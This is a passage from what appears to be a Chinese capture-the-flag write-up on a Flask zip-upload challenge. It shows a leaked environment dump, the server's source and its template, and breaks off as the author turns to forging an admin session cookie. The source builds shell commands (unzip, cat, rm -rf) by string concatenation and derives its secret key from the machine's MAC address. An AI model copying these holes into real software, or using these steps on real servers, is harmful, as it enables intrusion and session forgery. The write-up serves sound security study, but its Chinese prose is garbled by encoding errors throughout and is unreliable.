class="line">UWSGI_ORIGINAL_PROC_NAME&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;uwsgiSUPERVISOR_GROUP_NAME&#x3D;uwsgiHOSTNAME&#x3D;fa2af3bed43dSHLVL&#x3D;0PYTHON_PIP_VERSION&#x3D;18.1HOME&#x3D;&#x2F;rootGPG_KEY&#x3D;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI&#x3D;&#x2F;app&#x2F;it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD&#x3D;0UWSGI_PROCESSES&#x3D;16STATIC_URL&#x3D;&#x2F;staticUWSGI_CHEAPER&#x3D;2NGINX_VERSION&#x3D;1.13.12-1~stretchPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binNJS_VERSION&#x3D;1.13.12.0.2.0-1~stretchLANG&#x3D;C.UTF-8SUPERVISOR_ENABLED&#x3D;1PYTHON_VERSION&#x3D;3.6.6NGINX_WORKER_PROCESSES&#x3D;autoSUPERVISOR_SERVER_URL&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sockSUPERVISOR_PROCESS_NAME&#x3D;uwsgiLISTEN_PORT&#x3D;80STATIC_INDEX&#x3D;0PWD&#x3D;&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH&#x3D;&#x2F;app&#x2F;staticPYTHONPATH&#x3D;&#x2F;appUWSGI_RELOADS&#x3D;0</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ <code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code></p><p>æ ¹ç›®å½•ï¼š <code>/app/hard_t0_guess_n9f5a95b5ku9fg</code></p><p>ç»§ç»­è¯»é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module &#x3D; hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main</span><br><span class="line">callable&#x3D;app</span><br></pre></td></tr></table></figure><p><code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code> æ˜¯è¿è¡Œçš„æ–‡ä»¶ã€‚</p><p>ç¬¬ä¸€å¤©çš„æ—¶å€™è¿™ä¸ª py æ–‡ä»¶æ˜¯ä¸ª htmlâ€¦è„‘æ´ï¼Ÿåæ¥æœ‰ bug ä¸‹çº¿äº†ï¼Œå†ä¸Šçº¿è¯»ä¸€ä¸‹å°±æ˜¯æ­£å¸¸çš„ py ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/logout&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»£ç å‡ºç°å¯¹ index.html çš„æ¸²æŸ“ï¼Œè¯»ä¸€ä¸‹ index.html ï¼Œè·¯å¾„ï¼š</p><p><code>app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Message center<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;data:image/ico;base64,aWNv&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;navbar navbar-inverse navbar-fixed-top&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-header&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;navbar-toggle collapsed&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-target</span>=<span class="string">&quot;#navbar&quot;</span> <span class="attr">aria-expanded</span>=<span class="string">&quot;false&quot;</span> <span class="attr">aria-controls</span>=<span class="string">&quot;navbar&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;navbar-brand&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/#&quot;</span>&gt;</span>Message center<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;navbar&quot;</span> <span class="attr">class</span>=<span class="string">&quot;collapse navbar-collapse&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;active&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/#&quot;</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#about&quot;</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#contact&quot;</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          &#123;% if user %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-form navbar-right&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> &gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>&#123;&#123; user  &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;logout&quot;</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          &#123;% else %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;navbar-form navbar-right&quot;</span> <span class="attr">action</span>=<span class="string">&quot;login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;navbar&quot;</span> <span class="attr">class</span>=<span class="string">&quot;navbar-collapse collapse&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--/.nav-collapse --&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span> &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line">      body &#123;</span><br><span class="line">        padding-top: 50px;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="css">      <span class="selector-class">.starter-template</span> &#123;</span></span><br><span class="line">        padding: 40px 15px;</span><br><span class="line">        text-align: center;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;starter-template&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lead&quot;</span>&gt;</span></span><br><span class="line">        &#123;% if user %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123; user &#125;&#125;. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        &#123;% if user == &#x27;admin&#x27; %&#125;</span><br><span class="line">        Your flag: <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        &#123;&#123; flag  &#125;&#125;</span><br><span class="line"></span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>I will tell you a secret, but you should upload a zipfile first.<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;the_file&quot;</span>  /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>For more information, please login.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.container --&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% if forbidden %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;Sorry, you are not admin!&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ˜¯ admin å¯ä»¥å¾—åˆ° flagï¼Œflagæ˜¯ä» flag.py import çš„ï¼Œé‚£ä¹ˆå°è¯•è¯» flag.pyï¼Œå‘ç°è¿”å›ä¸æ˜¯ adminâ€¦</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ admin ç™»è¿›å»äº†ï¼Œè¿™é‡Œåœ¨ä»£ç çœ‹åˆ° session çš„ SECRET_KEY ç”Ÿæˆæ–¹å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 